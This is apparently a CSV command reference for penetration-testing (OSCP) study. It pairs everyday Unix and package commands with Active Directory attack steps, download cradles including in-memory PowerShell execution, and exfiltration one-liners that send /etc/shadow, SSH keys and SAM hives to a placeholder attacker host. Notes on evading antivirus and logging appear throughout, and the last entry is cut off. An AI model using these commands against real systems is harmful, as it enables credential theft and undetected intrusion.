"awk-print","AWK Text Processing","custom","awk '{print $<FIELD>}' <FILE>","Extract and process fields from text","","Great for extracting specific columns from command output","medium"
"cut-fields","Cut Fields","custom","cut -d '<DELIM>' -f <FIELDS> <FILE>","Extract specific fields from delimited text","","Example:
cut -d ':' -f 1 /etc/passwd extracts usernames","medium"
"sort-lines","Sort Lines","custom","sort <FILE>","Sort lines of text alphabetically","","Often combined with uniq to remove duplicates","low"
"uniq-lines","Remove Duplicate Lines","custom","uniq <FILE>","Remove adjacent duplicate lines (requires sorted input)","","Must sort first: sort file.txt | uniq","low"
"tr-characters","Translate Characters","custom","tr '<SET1>' '<SET2>'","Translate or delete characters from input","","Example:
echo 'hello' | tr 'a-z' 'A-Z' converts to uppercase","medium"
"base64-encode","Base64 Encode","custom","base64 <FILE>","Encode file or text to Base64","","Essential for encoding payloads and bypassing filters","high"
"base64-decode","Base64 Decode","custom","base64 -d <FILE>","Decode Base64 encoded data","","Use echo '<base64>' | base64 -d for inline decoding","high"
"xxd-hex","Hex Dump","custom","xxd <FILE>","Create hex dump of file or reverse hex dump to binary","","Useful for analyzing binary files and creating shellcode","medium"
"hexdump-file","Hexdump File","custom","hexdump -C <FILE>","Display file contents in hex and ASCII","","","medium"
"strings-file","Extract Strings","enumeration","strings <FILE>","Extract printable strings from binary files","","Essential for finding credentials, paths, function names in binaries","high"
"od-octal-dump","Octal Dump","custom","od -A x -t x1z -v <FILE>","Display file in octal/hex format","","","low"
"concept-authentication","Authenticate to Domain","utilities","# Manual authentication step - establish valid domain session","Conceptual step: Establish authenticated session to Active Directory using valid credentials. Not a single command but a verification of authentication state.","","This is a conceptual step representing authentication verification rather than a specific command. In practice, authentication happens through various tools (impacket, Rubeus, runas, etc.) depending on context.","low"
"concept-filter-accounts","Filter Service Accounts","utilities","# Manual filtering - remove computer accounts and MSAs from target list","Conceptual step: Manually filter out uncrackable accounts (computer accounts ending in $, managed service accounts) from Kerberoasting target list.","","This is a manual analysis step where you review enumeration output and identify which accounts are worth targeting. Computer accounts have 120-character random passwords and are uncrackable.","low"
"concept-decision","Choose Attack Method","utilities","# Manual decision - evaluate trade-offs and select optimal approach","Conceptual step: Analyze available tools and methods, consider trade-offs (speed vs stealth vs detection), and select optimal approach for current scenario.","","This represents strategic decision-making in penetration testing. Not a command to execute, but a critical thinking step to choose the right tool for the situation.","low"
"concept-enumeration","Active Directory Enumeration","utilities","# Manual enumeration - systematic AD reconnaissance with valid credentials","Conceptual step: Perform comprehensive Active Directory enumeration using various tools and techniques. Includes users, groups, computers, GPOs, ACLs, shares, and more.","","This is an umbrella concept covering multiple enumeration commands. Standard users can still perform extensive AD reconnaissance even without admin rights.","medium"
"concept-calculation","Calculate Safe Limits","utilities","# Manual calculation - determine safe password spray limits from lockout policy","Conceptual step: Calculate conservative safe spray limits based on lockout threshold and observation window. Formula: safe_attempts = threshold - 2, wait_time = observation_window + 5min buffer.","","Critical safety calculation for password spraying. Conservative approach subtracts 2 from threshold to account for user's own failed logins and timing uncertainty.","medium"
"concept-wait-timer","Wait for Observation Window","utilities","# Manual wait - observation window + buffer to ensure counter resets","Conceptual step: Wait for full observation window plus 5-minute buffer before next spray round. Use productive time for alternative enumeration and attacks.","","Not a command but a mandatory waiting period between password spray rounds. Critical for avoiding account lockouts. Use wait time productively for Kerberoasting, AS-REP roasting, etc.","medium"
"apt-install","Install Package with APT","custom","sudo apt install -y <PACKAGE>","Install Debian/Ubuntu package using apt package manager","","Essential for installing tools on Debian-based systems (Kali, Ubuntu, Parrot)","high"
"apt-update","Update Package List","custom","sudo apt update","Update available package list from repositories","","Run before apt install to ensure latest package versions","medium"
"apt-upgrade","Upgrade Installed Packages","custom","sudo apt upgrade -y","Upgrade all installed packages to latest versions","","Use before OSCP exam to ensure all tools are up-to-date","low"
"pip-install","Install Python Package (pip)","custom","pip install <PACKAGE>","Install Python package using pip (Python 2.x)","","Many exploits require Python packages - impacket, requests, etc.","high"
"pip3-install","Install Python 3 Package","custom","pip3 install <PACKAGE>","Install Python package using pip3 (Python 3.x)","","Prefer pip3 over pip for modern Python tools","high"
"npm-install","Install Node Package","custom","npm install <PACKAGE>","Install Node.js package using npm","","Occasionally needed for Node.js exploits or tools","low"
"gem-install","Install Ruby Gem","custom","gem install <GEM>","Install Ruby gem package","","Useful for evil-winrm and other Ruby-based tools","medium"
"yum-install","Install Package with YUM","custom","sudo yum install -y <PACKAGE>","Install RHEL/CentOS package using yum","","For Red Hat-based systems (less common in OSCP)","low"
"dnf-install","Install Package with DNF","custom","sudo dnf install -y <PACKAGE>","Install Fedora/RHEL 8+ package using dnf","","","low"
"brew-install","Install Package with Homebrew","custom","brew install <PACKAGE>","Install macOS package using Homebrew","","For macOS users preparing for OSCP","low"
"cargo-install","Install Rust Package","custom","cargo install <PACKAGE>","Install Rust package using cargo","","Useful for modern tools like feroxbuster, rustscan","low"
"go-get","Install Go Package","custom","go get <PACKAGE>","Install Go package (deprecated - use go install)","","Deprecated - use go install instead","low"
"go-install","Install Go Binary","custom","go install <PACKAGE>@latest","Install Go package binary (modern way)","","Preferred over go get for tools like gobuster, ffuf","low"
"choco-install","Install with Chocolatey (Windows)","custom","choco install <PACKAGE> -y","Install Windows package using Chocolatey","","For setting up Windows attack box","low"
"winget-install","Install with Winget (Windows)","custom","winget install <PACKAGE>","Install Windows package using winget","","Built into Windows 10/11 - no additional setup required","low"
"scoop-install","Install with Scoop (Windows)","custom","scoop install <PACKAGE>","Install Windows package using Scoop","","User-focused package manager - no admin rights required","low"
"ping-host","Ping Host","recon","ping -c <COUNT> <TARGET>","Test network connectivity using ICMP echo requests","","First test for connectivity - note Windows uses -n instead of -c","high"
"traceroute-host","Trace Route to Host","recon","traceroute <TARGET>","Trace network path to target showing all hops","","Useful for understanding network topology and firewall positions","medium"
"tracert-windows","Trace Route (Windows)","recon","tracert <TARGET>","Windows traceroute implementation","","","medium"
"dig-dns","DNS Lookup with Dig","recon","dig <DOMAIN> <TYPE>","Perform DNS query using dig","","Essential for DNS enumeration and zone transfer attempts","high"
"nslookup-dns","DNS Query with Nslookup","recon","nslookup <DOMAIN>","Query DNS records using nslookup","","Cross-platform DNS tool - works on Windows and Linux","high"
"host-dns","DNS Lookup with Host","recon","host <DOMAIN>","Simple DNS lookup utility","","Simpler than dig - good for quick lookups","high"
"whois-domain","WHOIS Lookup","recon","whois <DOMAIN>","Query WHOIS information for domain or IP","","Useful for identifying domain registrar, nameservers, contact info","medium"
"curl-url","Fetch URL with Curl","web","curl <URL>","Transfer data from or to a server using various protocols","","Essential for web enumeration, API testing, and file downloads","high"
"wget-url","Download with Wget","web","wget <URL>","Download files from web servers","","Simpler than curl for basic downloads - great for transferring files to targets","high"
"nc-listener","Netcat Listener","exploitation","nc -lvnp <PORT>","Start netcat listener for reverse shells","","Essential for catching reverse shells - run before triggering exploit","high"
"nc-connect","Netcat Connection","exploitation","nc <TARGET> <PORT>","Connect to remote host using netcat","","Useful for manual service interaction and banner grabbing","high"
"ssh-connect","SSH Connection","exploitation","ssh <USER>@<TARGET>","Connect to remote host via SSH","","Essential for accessing compromised hosts and port forwarding","high"
"scp-file","Secure Copy","file-transfer","scp <SOURCE> <USER>@<TARGET>:<DEST>","Securely copy files between hosts using SSH","","Fast file transfer when SSH access is available","high"
"rsync-files","Rsync Files","file-transfer","rsync -avz <SOURCE> <USER>@<TARGET>:<DEST>","Synchronize files between systems efficiently","","More efficient than scp for large transfers or syncing directories","medium"
"telnet-connect","Telnet Connection","enumeration","telnet <TARGET> <PORT>","Connect to remote host using telnet protocol","","Useful for banner grabbing and manual service interaction","medium"
"ftp-connect","FTP Connection","enumeration","ftp <TARGET>","Connect to FTP server","","Try anonymous login (user:
anonymous, pass:
anonymous@example.com)","medium"
"nmap-udp-scan","Nmap UDP Port Scan","enumeration","nmap -sU -p <PORT> <TARGET>","Scan UDP ports to verify service availability (commonly used for Kerberos port 88)","","UDP scanning is slower and less reliable than TCP. Use -Pn flag to skip host discovery if needed. Common for verifying Kerberos (88/udp), DNS (53/udp), SNMP (161/udp).","high"
"mkdir-directory","Create Directory","custom","mkdir -p <PATH>","Create directory with parent directories if they don't exist","","Essential for organizing enumeration output and creating staging directories","medium"
"chmod-executable","Make File Executable","custom","chmod +x <FILE>","Add execute permission to file for all users","","Required for running scripts, exploits, and compiled binaries","high"
"chmod-numeric-permissions","Set Numeric Permissions","custom","chmod <PERMS> <FILE>","Set file permissions using numeric (octal) notation","","Common permissions:
755 for executables, 644 for files, 700 for sensitive scripts","medium"
"chmod-writable","Make File Writable","custom","chmod +w <FILE>","Add write permission to file","","","medium"
"chown-file","Change File Ownership","custom","chown <USER>:<GROUP> <FILE>","Change file or directory owner and group","","Useful after uploading web shells or modifying system files","medium"
"cp-file","Copy File","custom","cp <SOURCE> <DEST>","Copy files or directories","","","medium"
"mv-file","Move/Rename File","custom","mv <SOURCE> <DEST>","Move or rename files and directories","","","medium"
"rm-file","Remove File","custom","rm <FILE>","Delete files or directories","","Be careful with rm -rf, especially as root - can destroy systems","medium"
"touch-file","Create Empty File","custom","touch <FILE>","Create empty file or update timestamp of existing file","","Useful for testing write permissions or creating placeholder files","low"
"ln-symbolic","Create Symbolic Link","custom","ln -s <TARGET> <LINK>","Create symbolic link pointing to target file or directory","","Useful for path traversal exploits or creating convenient shortcuts","medium"
"find-files","Find Files by Pattern","enumeration","find <PATH> -name <PATTERN>","Search for files matching pattern in directory tree","","Essential for privilege escalation - finding SUID binaries, writable files, config files","high"
"cat-file","Display File Contents","custom","cat <FILE>","Concatenate and display file contents to stdout","","Most common way to read files - essential for reading flags, configs, source code","high"
"grep-file","Search File Contents","enumeration","grep <PATTERN> <FILE>","Search for pattern in file contents","","Critical for finding credentials, API keys, sensitive data in files","high"
"head-file","Display First Lines","custom","head -n <LINES> <FILE>","Display first N lines of file","","","medium"
"tail-file","Display Last Lines","custom","tail -n <LINES> <FILE>","Display last N lines of file","","tail -f is essential for monitoring logs during exploitation","medium"
"less-file","View File with Pager","custom","less <FILE>","View file contents with scrolling and search capabilities","","Better than cat for large files - supports search with /, quit with q","medium"
"wc-file","Count Lines/Words/Characters","custom","wc <FILE>","Count lines, words, and characters in file","","Useful for checking wordlist sizes or output lengths","low"
"tar-extract","Extract Tar Archive","custom","tar -xvf <FILE>","Extract tar archive (supports .tar, .tar.gz, .tgz)","","Common for extracting exploit code or downloaded tools","medium"
"tar-create","Create Tar Archive","custom","tar -czvf <OUTPUT> <FILES>","Create compressed tar archive","","Useful for exfiltrating multiple files or creating backups","medium"
"unzip-file","Extract Zip Archive","custom","unzip <FILE>","Extract zip archive","","","medium"
"gzip-compress","Compress with Gzip","custom","gzip <FILE>","Compress file with gzip (creates .gz file)","","","low"
"gunzip-decompress","Decompress Gzip","custom","gunzip <FILE>","Decompress gzip file","","","low"
"verify-ntlm-hash","Verify NTLM Hash Obtained","utilities","test -f <HASH_FILE> && grep -qE '^[a-f0-9]{32}$' <HASH_FILE>","Check if NTLM hash file exists and contains valid 32-character hexadecimal hash format","","NTLM hash format:
lowercase hexadecimal, 32 characters.

Common sources:
secretsdump.py, mimikatz, crackmapexec --sam/--lsa","high"
"verify-crackmapexec-installed","Verify CrackMapExec Installed","utilities","which crackmapexec || which cme","Verify CrackMapExec is installed and available in system PATH","","CrackMapExec may be aliased as 'cme' in some environments.

Check both variants.","high"
"verify-neo4j-running","Verify Neo4j Database Running","utilities","systemctl is-active neo4j || sudo neo4j status | grep -q 'Neo4j is running'","Check if Neo4j database service is running and active","","Neo4j required for BloodHound data ingestion and Active Directory analysis.

Default ports:
7474 (HTTP), 7687 (Bolt).","medium"
"verify-web-server-up","Verify Web Server Responding","utilities","curl -I http://<TARGET>:<PORT> --connect-timeout 5 --max-time 10","Verify web server is responding to HTTP requests within timeout","","","high"
"verify-powerview-imported","Verify PowerView Module Loaded","utilities","powershell -Command ""Get-Command Get-NetDomain -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name""","Check if PowerView module is imported and cmdlets are available in PowerShell session","","PowerView cmdlets available after import:
Get-NetDomain, Get-NetUser, Get-NetGroup, Get-NetComputer, Invoke-ShareFinder","high"
"verify-impacket-installed","Verify Impacket Toolkit Installed","utilities","which secretsdump.py && which psexec.py && which GetNPUsers.py","Verify Impacket toolkit is installed with core scripts available","","Impacket pre-installed on Kali.

Core scripts:
secretsdump.py, psexec.py, smbexec.py, wmiexec.py, GetNPUsers.py, GetUserSPNs.py","high"
"verify-evil-winrm-installed","Verify Evil-WinRM Installed","utilities","which evil-winrm","Verify Evil-WinRM tool is installed and available for WinRM access","","Evil-WinRM provides interactive PowerShell remote shell over WinRM (port 5985 HTTP, 5986 HTTPS)","high"
"verify-nmap-installed","Verify Nmap Installed","utilities","which nmap","Verify Nmap network scanner is installed and available","","Nmap pre-installed on Kali Linux.

Essential for port scanning and service enumeration.","high"
"verify-mimikatz-available","Verify Mimikatz Available","utilities","test -f <MIMIKATZ_PATH>/mimikatz.exe","Check if Mimikatz executable exists at specified path on Windows host","","Mimikatz extracts plaintext passwords, hashes, tickets from memory.

Requires SYSTEM/Admin privileges.","high"
"verify-rubeus-available","Verify Rubeus.exe Available","utilities","test -f <RUBEUS_PATH>/Rubeus.exe","Check if Rubeus.exe Kerberos toolkit exists at specified path on Windows host","","Rubeus is C# toolkit for Kerberos attacks:
ASREPRoasting, Kerberoasting, overpass-the-hash, ticket manipulation","high"
"verify-getcap-installed","Verify getcap Utility Installed","utilities","which getcap","Verify getcap utility is installed for enumerating Linux capabilities","","Part of libcap2-bin package.

Used to find binaries with elevated capabilities (e.g., CAP_SETUID for privilege escalation)","medium"
"verify-docker-images-available","Verify Docker Images Available","utilities","docker images | grep -q alpine || docker pull alpine","Check if Docker images exist locally, pull alpine if none available","","Docker privilege escalation requires existing images or ability to pull.

Alpine is minimal (5MB) and commonly available.","medium"
"verify-curl-available","Verify curl or wget Available","utilities","which curl || which wget","Check if curl or wget is available for HTTP file transfers","","curl and wget pre-installed on most Linux.

Windows 10+ includes curl.exe.

Used for downloading exploits, tools, reverse shells.","high"
"verify-socat-installed","Verify Socat Installed on Pivot Host","utilities","which socat","Check if socat is installed for advanced port forwarding and redirection","","Socat is multipurpose relay tool for pivoting.

Can forward TCP/UDP, create reverse shells, port redirection.","medium"
"verify-rdp-service-running","Verify RDP Service Running on Target","utilities","nmap -p 3389 -Pn <TARGET> | grep -q 'open'","Check if Remote Desktop Protocol service is running and accessible on target","","RDP default port 3389.

Service name:
TermService (Windows).

Required for graphical remote access and lateral movement.","high"
"verify-python-available","Verify Python Available on Host","utilities","which python3 || which python","Check if Python interpreter is available for scripting and exploitation","","Python usually pre-installed on Linux.

Used for HTTP servers, reverse shells, exploit modifications, enumeration scripts.","high"
"verify-socks-proxy-running","Verify SOCKS Proxy Running","utilities","netstat -tulnp | grep -E ':<SOCKS_PORT>.*LISTEN'","Check if SOCKS proxy is listening on specified port for pivoting","","SOCKS proxy created via SSH dynamic port forwarding (ssh -D).

Configure proxychains:
/etc/proxychains4.conf","high"
"verify-credentials","Verify Valid Credentials","utilities","crackmapexec smb <TARGET> -u <USERNAME> -p <PASSWORD>","Verify credentials are valid against target SMB service","","Use to validate credentials before exploitation.

SMB (port 445) most reliable for Windows credential validation.","high"
"verify-powershell-access","Verify PowerShell Access on Windows Host","utilities","powershell -Command ""$PSVersionTable.PSVersion""","Check if PowerShell is accessible and display version information","","PowerShell v2+ on Windows 7+, v5.1 on Windows 10/Server 2016+.

Required for most Windows enumeration and exploitation scripts.","high"
"verify-network-connectivity","Verify Network Connectivity to Target","utilities","ping -c 4 <TARGET> || nc -zv <TARGET> <PORT>","Check basic network connectivity to target via ICMP or TCP","","","high"
"verify-root-access","Verify Root/Administrator Access","utilities","id | grep -qE '(uid=0|root)' || whoami /groups | grep -qE '(Administrators|BUILTIN\\Administrators)'","Check if current user has root (Linux) or Administrator (Windows) privileges","","Many post-exploitation tools require elevated privileges.

Linux:
uid=0, Windows:
Administrators/SYSTEM/Domain Admins groups.","high"
"verify-file-exists","Verify File Exists","utilities","test -f <FILE_PATH>","Check if specified file exists and is a regular file (not directory)","","test -f checks for regular files.

Use -d for directories, -e for any file type (file/dir/symlink).","medium"
"verify-port-open","Verify Port Open on Target","utilities","nc -zv <TARGET> <PORT>","Check if specified TCP port is open and accepting connections","","","high"
"verify-sql-injection-vulnerable","Verify SQL Injection Vulnerability","utilities","sqlmap -u ""http://<TARGET>/<ENDPOINT>?<PARAM>=<VALUE>"" --batch --dbs --level=1 --risk=1","Test if parameter is vulnerable to SQL injection using automated sqlmap scan","","","high"
"verify-smb-null-session","Verify SMB Null Session Allowed","utilities","smbclient -N -L //<TARGET>","Check if target allows SMB null session for anonymous share enumeration","","Null sessions deprecated post-Windows 2000 but sometimes enabled on legacy systems.

IPC$ share indicates anonymous access.","high"
"verify-ldap-anonymous-bind","Verify LDAP Anonymous Bind Allowed","utilities","ldapsearch -x -H ldap://<TARGET> -b """" -s base ""(objectClass=*)""","Check if LDAP server allows anonymous bind for unauthenticated enumeration","","Anonymous LDAP bind often disabled in hardened environments.

If allowed, provides base DN for further enumeration.","high"
"ft-certutil-download","Windows: certutil Download","file-transfer","certutil -urlcache -f http://<LHOST>:<PORT>/<FILE> <OUTPUT>","Download file on Windows using certutil (built-in, often bypasses restrictions)","windows-download","OSCP METHODOLOGY: First choice for Windows downloads. Certutil is a legitimate Windows certificate management tool, so it's often whitelisted by AV and application whitelisting solutions. Living-off-the-land binary (LOLBin).

MANUAL ALTERNATIVE: Copy/paste file contents if very small, or use ft-vbscript-download on ancient systems.

WHY IT WORKS: Windows admins rarely block certutil because it's used for legitimate certificate operations. Defenders often miss it in logs.

EXAM TIP: If initial shell is cmd.exe, this is your fastest download method. Test immediately after getting shell. Can also encode/decode Base64: certutil -encode in.exe out.txt && certutil -decode out.txt restored.exe

COMMON GOTCHA: Leaves cache artifacts in C:\Users\<USER>\AppData\LocalLow\Microsoft\CryptnetUrlCache

TIME ESTIMATE: 2-10 seconds for typical tools (100KB-10MB). Faster than PowerShell for small files.","high"
"ft-powershell-iwr","Windows: PowerShell Invoke-WebRequest","file-transfer","powershell -ep bypass -c ""Invoke-WebRequest -Uri http://<LHOST>:<PORT>/<FILE> -OutFile <OUTPUT>""","Download file using PowerShell Invoke-WebRequest (modern, verbose progress)","windows-download","OSCP METHODOLOGY: Second choice for Windows downloads after certutil. More modern and flexible, but can be slower and more detectable. Alias IWR can be used in PowerShell prompt: IWR http://<IP>/<FILE> -OutFile <FILE>

MANUAL ALTERNATIVE: Use browser if RDP available, but that's rarely the case in OSCP shells.

WHY -ep bypass: Most Windows servers have Restricted execution policy preventing script execution. This bypasses it for this session only (non-persistent).

EXAM TIP: If you get 'Internet Explorer not initialized' error, add -UseBasicParsing. For in-memory execution without touching disk: IEX(IWR http://<IP>/script.ps1 -UseBasicParsing)

VS WEBCLIENT: Invoke-WebRequest shows progress and is more PowerShell-native, but WebClient.DownloadFile() is faster for large files.

TIME ESTIMATE: 5-20 seconds for typical tools, slower than certutil due to PowerShell overhead.","high"
"ft-powershell-webclient","Windows: PowerShell WebClient Download","file-transfer","powershell -ep bypass -c ""(New-Object System.Net.WebClient).DownloadFile('http://<LHOST>:<PORT>/<FILE>','<OUTPUT>')""","Download file using .NET WebClient class (faster than Invoke-WebRequest)","windows-download","OSCP METHODOLOGY: Fastest PowerShell download method for large files (>10MB). Uses .NET directly instead of PowerShell cmdlets, reducing overhead. No progress indicator - silent execution.

MANUAL ALTERNATIVE: Could use WinHTTP or BITS COM objects, but WebClient is simplest.

IN-MEMORY VARIANT: For in-memory execution without touching disk: IEX(New-Object Net.WebClient).DownloadString('http://<IP>/script.ps1')

EXAM TIP: Use this for large payloads (Mimikatz, Rubeus, etc.) where speed matters. Remember the filename in output path - easy to forget and get errors.

VS INVOKE-WEBREQUEST: WebClient is 2-5x faster for files >10MB, no IE dependency, but less features (no -UseBasicParsing issues).

TIME ESTIMATE: 2-5 seconds for tools under 5MB, faster than IWR and comparable to certutil.","high"
"ft-smb-download","Windows: SMB Copy from Share","file-transfer","copy \\<LHOST>\<SHARE>\<FILE> <DEST>","Copy file from Kali SMB share to Windows target (fastest for large files)","windows-download","OSCP METHODOLOGY: Fastest transfer method for Windows targets on internal network. 10-100x faster than HTTP for large files (>10MB). Port 445 often allowed internally even when HTTP egress is blocked.

MANUAL ALTERNATIVE: Mount share persistent: net use Z: \\<IP>\share then access as Z:\ drive.

DIRECT EXECUTION: Can run tools directly from share without copying: \\<IP>\share\winPEAS.exe > output.txt (saves disk space, leaves less artifacts)

EXAM TIP: If HTTP download fails or is slow, immediately try SMB. On newer Windows (10+), you'll need authenticated SMB - setup with -username/-password flags on impacket-smbserver.

SECURITY EVASION: SMB transfers are harder to detect in logs than HTTP downloads (blends with normal network file sharing).

TIME ESTIMATE: Near-instant for files under 50MB on local network, limited only by network speed.","high"
"ft-bitsadmin-download","Windows: bitsadmin Download","file-transfer","bitsadmin /transfer <JOB_NAME> /download /priority high http://<LHOST>:<PORT>/<FILE> <OUTPUT>","Download file using Windows BITS service (background transfer, stealthier)","windows-download","OSCP METHODOLOGY: Third choice for Windows downloads when certutil and PowerShell are blocked or monitored. Uses Windows Background Intelligent Transfer Service (BITS) - designed for downloading Windows Updates, so often whitelisted.

MANUAL ALTERNATIVE: Could use GUI Component Services to create BITS job, but command line is faster.

STEALTH BENEFITS: BITS transfers blend with Windows Update traffic. Uses /priority low for stealthy background transfers that throttle when network busy.

EXAM TIP: Slower than certutil/PowerShell for small files but more reliable for large files (auto-resumes on connection loss). Can be detected by EDR monitoring BITS jobs.

LIMITATIONS: Requires BITS service running (enabled by default). Must use absolute paths for OUTPUT.

TIME ESTIMATE: 10-30 seconds for typical tools (slower due to BITS overhead), but reliable for files >50MB.","medium"
"ft-powershell-upload","Windows: PowerShell Upload File","file-transfer","powershell -ep bypass -c ""Invoke-RestMethod -Uri http://<LHOST>:<PORT>/upload -Method Post -InFile '<FILE>'""","Upload file from Windows target to uploadserver (exfiltration)","upload","OSCP METHODOLOGY: Primary exfiltration method for Windows targets. Clean, fast, uses HTTPS-capable PowerShell. Ideal for proof.txt, database dumps, or any files under 100MB.

MANUAL ALTERNATIVE: Could manually encode file as base64 and copy/paste, but direct upload is faster and cleaner.

EXAM TIP: Start uploadserver on Kali BEFORE running this command. Files save to directory where uploadserver started - cd to organized location first. Verify upload success: ls -lh and md5sum on Kali.

COMMON TARGETS: proof.txt, local.txt, SAM/SYSTEM hives, Secretsdump.py output, screenshots, database files.

VS SMB UPLOAD: PowerShell upload works over HTTP (port 80/443) which often passes egress filters better than SMB (port 445). SMB is faster for large files.

TIME ESTIMATE: 2-10 seconds for typical proof files (<1MB), longer for large files (database dumps, memory dumps).","high"
"ft-smb-upload","Windows: Upload to SMB Share","file-transfer","copy ""<FILE>"" \\<LHOST>\<SHARE>\","Upload file from Windows target to Kali SMB share (fastest for large files)","upload","OSCP METHODOLOGY: Fastest exfiltration method for large files (>10MB) from Windows targets. 10-100x faster than HTTP for database dumps, memory dumps, or archives. Works well on internal networks where port 445 allowed.

MANUAL ALTERNATIVE: Mount as persistent drive: net use Z: \\<IP>\share then copy files to Z:\ drive.

EXAM TIP: If uploading multiple files, use wildcards: copy C:\loot\*.* \\<IP>\share\ to transfer entire directory. For newer Windows (10+), expect to need authentication - setup SMB server with -username/-password flags.

SECURITY EVASION: SMB file copies blend with normal network file sharing traffic, harder to detect than HTTP uploads.

VS HTTP UPLOAD: SMB is much faster for large files but requires port 445. HTTP upload works through more restrictive firewalls (port 80/443).

TIME ESTIMATE: Limited only by network speed - can transfer multi-GB files in minutes on local network.","high"
"ft-curl-upload","Linux: Curl Upload File","file-transfer","curl -X POST -F file=@<FILE> http://<LHOST>:<PORT>/upload","Upload file from Linux target to uploadserver (exfiltration)","upload","OSCP METHODOLOGY: Primary exfiltration method for Linux targets. Clean, fast, uses HTTP which typically passes egress filters. Ideal for proof.txt, /etc/shadow, database dumps, or any sensitive files.

MANUAL ALTERNATIVE: Could use base64 encoding and copy/paste for small files, but direct upload is cleaner and works for binary files.

ALTERNATIVE UPLOAD: curl --upload-file <FILE> http://<IP>:<PORT>/ (PUT method, may not work with uploadserver)

EXAM TIP: Start uploadserver on Kali BEFORE running this command. Files save to directory where uploadserver started - cd to organized location first (/root/loot/<TARGET>/). Verify upload: ls -lh and md5sum.

COMMON TARGETS: proof.txt, /etc/passwd, /etc/shadow, .ssh/id_rsa, database dumps, config files with credentials.

PROGRESS INDICATION: Add -# for progress bar on large files: curl -# -X POST -F file=@largefile.zip http://...

TIME ESTIMATE: 2-5 seconds for typical files (<5MB), longer for large database/memory dumps.","high"
"ft-nc-receive","Netcat: Receive File","file-transfer","nc -lvnp <LPORT> > <OUTPUT>","Receive file using netcat listener (attacker receives from target)","netcat","OSCP METHODOLOGY: Simple, universal file exfiltration. Works when HTTP/SMB are blocked. No server setup required beyond nc. Useful for quick one-off transfers.

MANUAL ALTERNATIVE: Python socket server, but nc is simpler and almost always available.

TARGET COMMAND: From target to send file: nc <LHOST> <LPORT> < file_to_exfil.txt (Linux) or type file.txt | nc <LHOST> <LPORT> (Windows)

EXAM TIP: Start listener BEFORE sending command to target. Connection is one-shot - closes after transfer. For multiple files, restart listener each time. Monitor file size in real-time: watch -n1 ls -lh <OUTPUT>

BINARY FILES: Works perfectly for binary files (executables, images, archives) - netcat is protocol-agnostic.

NO PROGRESS: No transfer progress - you won't know when complete until connection closes. For large files, check output size periodically.

TIME ESTIMATE: Limited by network bandwidth, typically 1-10MB/sec on local network.","high"
"ft-nc-send","Netcat: Send File","file-transfer","nc <LHOST> <LPORT> < <FILE>","Send file from target to netcat listener on attack machine","netcat","OSCP METHODOLOGY: Simple, universal file exfiltration when HTTP/SMB unavailable. Works with just netcat - no web server required. Perfect for quick one-off transfers or restricted environments.

MANUAL ALTERNATIVE: Could use telnet or /dev/tcp, but nc is most common.

LISTENER COMMAND: On Kali, start receiver FIRST: nc -lvnp <PORT> > received_file.txt

EXAM TIP: Ensure listener running before sending file. Connection is one-shot - closes after transfer. For multiple files, restart listener each time. Verify integrity with md5sum on both sides.

WINDOWS POWERSHELL: PowerShell does NOT support < redirection. Use piping instead:
- Get-Content file.txt | nc.exe <IP> <PORT>
- type file.txt | nc.exe <IP> <PORT> (shorter)
- cmd /c ""nc.exe <IP> <PORT> < file.txt"" (runs in cmd.exe)

WINDOWS CMD.EXE: Supports < redirection directly: nc.exe <IP> <PORT> < file.txt

BINARY FILES: Works perfectly for binary files - netcat is protocol-agnostic. Use same command for executables, images, archives.

NO PROGRESS: No transfer progress indicator - you won't know when complete. Check listener output for file growth.

TIME ESTIMATE: Limited by network bandwidth, typically 1-10MB/sec on local network. Near-instant for small text files.","high"
"ft-powershell-tcp-send","PowerShell: Pure TCP Send File","file-transfer","$client = New-Object System.Net.Sockets.TcpClient(""<LHOST>"", <LPORT>); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); Get-Content <FILE> | ForEach-Object { $writer.WriteLine($_) }; $writer.Flush(); $client.Close()","Send file via pure PowerShell TCP socket (no external tools, works when nc.exe unavailable)","netcat","OSCP METHODOLOGY: Use when nc.exe is not available on Windows target but PowerShell is accessible. Pure PowerShell solution - no external binaries needed. Works in constrained environments where only PowerShell is allowed.

WHEN TO USE:
- nc.exe not on target system
- Execution policy blocks downloading nc.exe
- AV/EDR blocks netcat binaries
- Need living-off-the-land approach

LISTENER COMMAND: On Kali: nc -lvnp <PORT> > received_file.txt

TEXT FILES ONLY: This method uses WriteLine() which is designed for text. For binary files (executables, images, zip files), use ft-powershell-upload (HTTP POST) or ft-smb-upload instead.

EXAM TIP: Start listener BEFORE running PowerShell command. Can paste entire one-liner into PowerShell prompt. For multi-line version (easier to read/debug), separate commands with semicolons or newlines.

MULTI-LINE VERSION:
$client = New-Object System.Net.Sockets.TcpClient(""<LHOST>"", <LPORT>)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
Get-Content <FILE> | ForEach-Object { $writer.WriteLine($_) }
$writer.Flush()
$client.Close()

VS NETCAT: No external dependencies, but text-only. Use nc.exe if available for binary support.

VS HTTP UPLOAD: TCP is simpler (just listener needed), but HTTP upload (ft-powershell-upload) works better for binary files and large transfers.

STEALTH: Pure PowerShell TCP - no suspicious binary execution. Blends with normal PowerShell activity.

TIME ESTIMATE: 5-30 seconds for typical text files (<5MB). Slower than nc.exe due to PowerShell overhead.","medium"
"ft-file-verify-md5","Verify File Transfer with MD5 Hash","file-transfer","md5sum <FILE>","Calculate MD5 hash of transferred file to verify integrity. Compare with original hash from Kali to ensure successful transfer. ALWAYS verify after file transfer to avoid corrupted payloads.","verification","ALWAYS VERIFY after file transfer. OSCP WORKFLOW: (1) Calculate hash on Kali: md5sum /opt/tools/LinEnum.sh, (2) Transfer file to target, (3) Calculate hash on target: md5sum LinEnum.sh, (4) Compare hashes - must match exactly. COMMON CORRUPTION CAUSES: FTP text mode for binary files, incomplete wget (connection interrupted), copy/paste corruption (terminal encoding issues). Time estimate: <1 second per file. EXAM TIP: Create quick verification script: for f in *.exe; do echo ""$f:""; md5sum ""$f""; done

MANUAL ALTERNATIVES:

Linux MD5 verification:
md5sum <FILE>
# Compare output with original: md5sum /opt/tools/<FILE>

Windows PowerShell verification:
Get-FileHash -Algorithm MD5 <FILE> | Select-Object -ExpandProperty Hash
# Compare with: Get-FileHash -Algorithm MD5 \\<KALI>\share\<FILE>

Windows certutil verification:
certutil -hashfile <FILE> MD5
# Output includes extra text - ignore CertUtil header/footer

Batch verify multiple files (Linux):
md5sum exploit.sh nc.exe LinEnum.sh > hashes.txt
# On Kali, create matching file:
